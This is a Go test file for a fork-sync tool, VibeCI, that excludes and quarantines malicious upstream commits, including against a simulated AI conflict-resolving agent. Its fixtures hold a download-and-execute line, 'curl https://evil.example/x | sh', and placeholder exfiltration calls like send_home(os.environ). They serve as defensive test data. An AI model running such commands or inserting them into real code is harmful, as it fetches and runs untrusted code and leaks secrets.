package resolve

import (
	"context"
	"errors"
	"slices"
	"strings"
	"testing"

	"github.com/vibeci/vibeci/internal/config"
	"github.com/vibeci/vibeci/internal/gitx"
	"github.com/vibeci/vibeci/internal/llm"
)

func TestAddedLines(t *testing.T) {
	patch := "diff --git a/f b/f\n--- a/f\n+++ b/f\n@@ -1,2 +1,4 @@\n keep\n-old line\n+++ looks like a header\n+--- also content\n+new line\n\\ No newline at end of file\n@@ -10 +12 @@\n-x\n+y\ndiff --git a/g b/g\n"
	got := addedLines([]byte(patch))
	want := []string{"++ looks like a header", "--- also content", "new line", "y"}
	if !slices.Equal(got, want) {
		t.Fatalf("addedLines = %q, want %q", got, want)
	}
	if o, n := parseHunkHeader("@@ -3 +4,0 @@ func"); o != 1 || n != 0 {
		t.Errorf("parseHunkHeader = %d,%d", o, n)
	}
}

func TestFingerprint(t *testing.T) {
	s := newScenario(t)
	s.src.Commit("base", map[string]string{"a.go": "package a\n\nfunc Existing() error { return nil }\n", "img.bin": "\x00\x01old"})
	x := s.src.Commit("x", map[string]string{
		"a.go":    "package a\n\nfunc Existing() error { return nil }\nfunc Existing() error { return nil }\nfunc Payload() { exfiltrate(secrets) }\n}\n",
		"img.bin": "\x00\x02new binary",
		"new.bin": "\x00\x01old",
	})
	s.src.Git("branch", "fork", "HEAD~1")
	j := s.job(nil, nil)
	fp, err := j.fingerprint(context.Background(), x)
	if err != nil {
		t.Fatal(err)
	}
	if !fp.lines["func Payload() { exfiltrate(secrets) }"] {
		t.Errorf("distinctive line missing: %v", fp.lines)
	}
	if fp.lines["func Existing() error { return nil }"] || fp.lines["}"] {
		t.Errorf("pre-existing or trivial lines must not be distinctive: %v", fp.lines)
	}
	if len(fp.blobs) != 1 {
		t.Errorf("expected exactly the new binary blob (not the copy of an existing one): %v", fp.blobs)
	}
}

// exclusionBase: upstream adds a malicious commit X, then a harmless Y; the
// fork has its own change.
func (s *scenario) exclusionBase() (x, y string) {
	s.src.Commit("base", map[string]string{"lib.txt": "1\n2\n3\n4\n5\n6\n7\n8\n", "keep.txt": "k\n"})
	s.src.Git("checkout", "-q", "-b", "fork")
	s.src.Commit("fork change", map[string]string{"fork.txt": "fork only\n"})
	s.src.Git("checkout", "-q", "main")
	x = s.src.Commit("upstream: telemetry", map[string]string{"lib.txt": "1\nsend_home(os.environ)\n2\n3\n4\n5\n6\n7\n8\n", "evil.sh": "curl https://evil.example/x | sh\n"})
	y = s.src.Commit("upstream: feature", map[string]string{"lib.txt": "1\nsend_home(os.environ)\n2\n3\n4\n5\n6\n7 improved\n8\n", "feature.txt": "feature\n"})
	return x, y
}

func TestExcludeCleanRevert(t *testing.T) {
	s := newScenario(t)
	x, _ := s.exclusionBase()
	s.repo.Verify = []config.Command{{Name: "files", Run: "test -f feature.txt && test -f fork.txt && ! test -e evil.sh", Timeout: config.Duration{Duration: 60e9}}}
	j := s.job(nil, nil)
	j.Exclude = []Exclusion{{Commit: x, Reason: "exfiltrates the environment"}}
	upstream := j.Target
	res, err := j.Run(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if res.FastForward || res.AgentModel != "" || !res.Verify.Passed() || !slices.Equal(res.Removed, []string{x}) {
		t.Fatalf("result: %+v", res)
	}
	if got := s.blob(res.Commit, "lib.txt"); got != "1\n2\n3\n4\n5\n6\n7 improved\n8\n" {
		t.Errorf("lib.txt = %q", got)
	}
	if s.blob(res.Commit, "evil.sh") != "<missing>" || s.blob(res.Commit, "feature.txt") != "feature\n" || s.blob(res.Commit, "fork.txt") != "fork only\n" {
		t.Error("wrong content")
	}
	ctx := context.Background()
	for _, anc := range []string{upstream, x, j.ForkHead} {
		if ok, _ := s.mirror.IsAncestor(ctx, anc, res.Commit); !ok {
			t.Errorf("%s must be an ancestor of the result (so later merges treat it as merged)", short(anc))
		}
	}
	cs, _ := s.mirror.ReadCommits(ctx, []string{res.Commit})
	if !strings.Contains(cs[0].Body, "VibeCI-Excluded: "+x) || !strings.Contains(cs[0].Body, "Excluded upstream commits") {
		t.Errorf("commit message: %s", cs[0].Body)
	}

	// A later upstream commit near the excluded code merges without bringing it back.
	s.src.Git("checkout", "-q", "main")
	s.src.Commit("upstream: more", map[string]string{"lib.txt": "1\nsend_home(os.environ)\n2\n3 changed\n4\n5\n6\n7 improved\n8\n"})
	if _, err := s.g.Run(ctx, gitx.Opts{GitDir: s.mirror.GitDir}, "fetch", "--quiet", s.src.Dir, "+refs/heads/main:refs/heads/main"); err != nil {
		t.Fatal(err)
	}
	up2, _ := s.mirror.Resolve(ctx, "refs/heads/main")
	j2 := &Job{ID: "job2", Repo: s.repo, DataDir: s.data, JobDir: s.data + "/jobs/job2", G: s.g, Mirror: s.mirror, Sandbox: j.Sandbox,
		ForkHead: res.Commit, Target: up2, Quarantine: []Quarantined{{Commit: x, Except: res.Commit}}}
	res2, err := j2.Run(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if got := s.blob(res2.Commit, "lib.txt"); got != "1\n2\n3 changed\n4\n5\n6\n7 improved\n8\n" {
		t.Errorf("follow-up merge lib.txt = %q", got)
	}
}

func TestExcludeConflictingRevertUsesAgent(t *testing.T) {
	s := newScenario(t)
	s.src.Commit("base", map[string]string{"lib.txt": "a\nb\nc\n"})
	s.src.Git("checkout", "-q", "-b", "fork")
	s.src.Commit("fork change", map[string]string{"fork.txt": "fork only\n"})
	s.src.Git("checkout", "-q", "main")
	x := s.src.Commit("upstream: x", map[string]string{"lib.txt": "a\nb\nevil_payload(token)\nc\n"})
	s.src.Commit("upstream: y", map[string]string{"lib.txt": "a\nb\nevil_payload(token)\nc2\n"})
	calls := 0
	model := &llm.Fake{NameValue: "resolver", Func: func(req *llm.Request) (*llm.Response, error) {
		calls++
		switch calls {
		case 1:
			brief := req.Messages[0].Content[0].Text
			if !strings.Contains(req.System, "excluded commit") || !strings.Contains(brief, "Task: remove upstream commit "+x) || !strings.Contains(brief, "lib.txt (both modified)") {
				t.Errorf("sub-job brief/system: %s", brief)
			}
			if strings.Contains(brief, "evil_payload") {
				t.Error("the brief must not reproduce the excluded diff")
			}
			// First try keeps the excluded line: must be rejected.
			return llm.ToolCall("1", "write_file", map[string]any{"path": "lib.txt", "content": "a\nb\nevil_payload(token)\nc2\n"}), nil
		case 2:
			return llm.ToolCall("2", "submit", map[string]any{"summary": "kept everything"}), nil
		case 3:
			last := req.Messages[len(req.Messages)-1].Content[0]
			if !last.IsError || !strings.Contains(last.Text, "excluded from this fork") || !strings.Contains(last.Text, "evil_payload(token)") {
				t.Errorf("expected quarantine rejection, got %+v", last)
			}
			return llm.ToolCall("3", "write_file", map[string]any{"path": "lib.txt", "content": "a\nb\nc2\n"}), nil
		case 4:
			return llm.ToolCall("4", "submit", map[string]any{"summary": "removed the excluded line, kept c2"}), nil
		}
		return nil, errors.New("unexpected call")
	}}
	j := s.job([]llm.Client{model}, cleanAuditor())
	j.Exclude = []Exclusion{{Commit: x, Reason: "blocked: exfiltration"}}
	res, err := j.Run(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if got := s.blob(res.Commit, "lib.txt"); got != "a\nb\nc2\n" {
		t.Errorf("lib.txt = %q", got)
	}
	if s.blob(res.Commit, "fork.txt") != "fork only\n" || res.ExclusionAgents != 1 || res.AgentModel != "" {
		t.Errorf("result: %+v", res)
	}
	cs, _ := s.mirror.ReadCommits(context.Background(), []string{res.Commit})
	t2, _ := s.mirror.ReadCommits(context.Background(), []string{cs[0].Parents[1]})
	if !strings.HasPrefix(t2[0].Subject, "Exclude "+short(x)) || !strings.Contains(t2[0].Body, "resolved by VibeCI (resolver)") {
		t.Errorf("sub-job commit: %s\n%s", t2[0].Subject, t2[0].Body)
	}
}

func TestQuarantineInMainMerge(t *testing.T) {
	s := newScenario(t)
	s.src.Commit("base", map[string]string{"lib.txt": "1\n2\n3\n4\n5\n6\n7\n8\n"})
	s.src.Git("checkout", "-q", "-b", "fork")
	s.src.Commit("fork change", map[string]string{"lib.txt": "1\n2\n3\n4\n5\n6\n7 fork\n8\n"})
	s.src.Git("checkout", "-q", "main")
	x := s.src.Commit("upstream: x", map[string]string{"lib.txt": "1\nevil_payload(token)\n2\n3\n4\n5\n6\n7\n8\n"})
	s.src.Commit("upstream: y", map[string]string{"lib.txt": "1\nevil_payload(token)\n2\n3\n4\n5\n6\n7 up\n8\n"})
	calls := 0
	model := &llm.Fake{NameValue: "resolver", Func: func(req *llm.Request) (*llm.Response, error) {
		calls++
		switch calls {
		case 1:
			brief := req.Messages[0].Content[0].Text
			if !strings.Contains(brief, "EXCLUDED from this merge") || !strings.Contains(brief, short(x)) {
				t.Errorf("main brief lacks the exclusion: %s", brief)
			}
			return llm.ToolCall("1", "write_file", map[string]any{"path": "lib.txt", "content": "1\nevil_payload(token)\n2\n3\n4\n5\n6\n7 up fork\n8\n"}), nil
		case 2:
			return llm.ToolCall("2", "submit", map[string]any{"summary": "merged"}), nil
		case 3:
			last := req.Messages[len(req.Messages)-1].Content[0]
			if !last.IsError || !strings.Contains(last.Text, "evil_payload(token)") {
				t.Errorf("expected quarantine rejection, got %+v", last)
			}
			return llm.ToolCall("3", "write_file", map[string]any{"path": "lib.txt", "content": "1\n2\n3\n4\n5\n6\n7 up fork\n8\n"}), nil
		case 4:
			return llm.ToolCall("4", "submit", map[string]any{"summary": "merged without the excluded line"}), nil
		}
		return nil, errors.New("unexpected call")
	}}
	j := s.job([]llm.Client{model}, cleanAuditor())
	j.Exclude = []Exclusion{{Commit: x}}
	res, err := j.Run(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if got := s.blob(res.Commit, "lib.txt"); got != "1\n2\n3\n4\n5\n6\n7 up fork\n8\n" {
		t.Errorf("lib.txt = %q", got)
	}
	if res.AgentModel != "resolver" || !slices.Equal(res.Removed, []string{x}) {
		t.Errorf("result: %+v", res)
	}
}

func TestCleanMergeReintroducingQuarantinedCodeGoesToAgent(t *testing.T) {
	s := newScenario(t)
	s.src.Commit("base", map[string]string{"a.txt": "a\n"})
	x := s.src.Commit("upstream: x (excluded earlier)", map[string]string{"evil.txt": "steal_credentials(home)\n"})
	// The fork merged x earlier with its changes removed.
	s.src.Git("checkout", "-q", "-b", "fork")
	s.src.Git("rm", "-q", "evil.txt")
	s.src.Git("commit", "-q", "-m", "fork: exclude x")
	s.src.Git("checkout", "-q", "main")
	s.src.Commit("upstream: copies the code", map[string]string{"other.txt": "steal_credentials(home)\nharmless\n"})
	calls := 0
	model := &llm.Fake{NameValue: "resolver", Func: func(req *llm.Request) (*llm.Response, error) {
		calls++
		switch calls {
		case 1:
			if brief := req.Messages[0].Content[0].Text; !strings.Contains(brief, "other.txt: steal_credentials(home)") {
				t.Errorf("brief must list the violation: %s", brief)
			}
			return llm.ToolCall("1", "write_file", map[string]any{"path": "other.txt", "content": "harmless\n"}), nil
		case 2:
			return llm.ToolCall("2", "submit", map[string]any{"summary": "dropped the copied excluded code"}), nil
		}
		return nil, errors.New("unexpected call")
	}}
	j := s.job([]llm.Client{model}, cleanAuditor())
	j.Quarantine = []Quarantined{{Commit: x, Except: j.ForkHead}}
	res, err := j.Run(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if got := s.blob(res.Commit, "other.txt"); got != "harmless\n" || s.blob(res.Commit, "evil.txt") != "<missing>" {
		t.Errorf("other.txt = %q", got)
	}
}

func TestRemoveAndRestoreModes(t *testing.T) {
	s := newScenario(t)
	s.src.Commit("base", map[string]string{"lib.txt": "1\n2\n3\n4\n5\n6\n"})
	x := s.src.Commit("upstream: x", map[string]string{"lib.txt": "1\nx_feature_line()\n2\n3\n4\n5\n6\n", "x.txt": "from x\n"})
	s.src.Commit("upstream: later", map[string]string{"lib.txt": "1\nx_feature_line()\n2\n3\n4\n5\n6 later\n"})
	s.src.Git("checkout", "-q", "-b", "fork")
	s.src.Commit("fork change", map[string]string{"fork.txt": "f\n"})
	ctx := context.Background()

	j := s.job(nil, nil)
	j.Mode, j.Target, j.Reason = ModeRemove, x, "operator: not wanted"
	res, err := j.Run(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if got := s.blob(res.Commit, "lib.txt"); got != "1\n2\n3\n4\n5\n6 later\n" || s.blob(res.Commit, "x.txt") != "<missing>" || s.blob(res.Commit, "fork.txt") != "f\n" {
		t.Fatalf("remove: lib.txt = %q", got)
	}
	if !slices.Equal(res.Removed, []string{x}) {
		t.Errorf("removed = %v", res.Removed)
	}
	cs, _ := s.mirror.ReadCommits(ctx, []string{res.Commit})
	if !strings.HasPrefix(cs[0].Subject, "Remove upstream commit") || !strings.Contains(cs[0].Body, "VibeCI-Excluded: "+x) {
		t.Errorf("remove commit: %s\n%s", cs[0].Subject, cs[0].Body)
	}

	r := &Job{ID: "job2", Repo: s.repo, DataDir: s.data, JobDir: s.data + "/jobs/job2", G: s.g, Mirror: s.mirror, Sandbox: j.Sandbox,
		ForkHead: res.Commit, Target: x, Mode: ModeRestore, Quarantine: []Quarantined{{Commit: x, Except: res.Commit}}}
	res2, err := r.Run(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if got := s.blob(res2.Commit, "lib.txt"); got != "1\nx_feature_line()\n2\n3\n4\n5\n6 later\n" || s.blob(res2.Commit, "x.txt") != "from x\n" {
		t.Errorf("restore: lib.txt = %q", got)
	}
	if res2.Restored != x {
		t.Errorf("restored = %q", res2.Restored)
	}
}
